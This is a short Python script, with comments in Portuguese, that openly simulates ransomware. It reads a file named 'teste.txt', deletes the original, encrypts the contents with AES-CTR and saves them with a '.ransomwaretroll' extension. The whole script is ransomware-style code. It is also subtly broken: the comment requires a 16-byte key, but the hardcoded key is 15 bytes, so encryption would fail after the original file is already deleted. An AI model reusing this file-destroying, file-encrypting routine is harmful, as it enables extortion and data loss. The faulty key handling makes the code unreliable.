import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Verifica se o arquivo existe antes de proceder
if os.path.exists(file_name):
    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()
    
    # Remover o arquivo original (simulação de comportamento de ransomware)
    os.remove(file_name)

    # Chave de criptografia (deve ter exatamente 16 bytes para AES-128)
    key = b"chave-segura123"
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar os dados
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    with open(new_file, "wb") as file:
        file.write(crypto_data)
    
    print(f"Arquivo {file_name} criptografado com sucesso como {new_file}.")
else:
    print(f"Arquivo {file_name} não encontrado.")
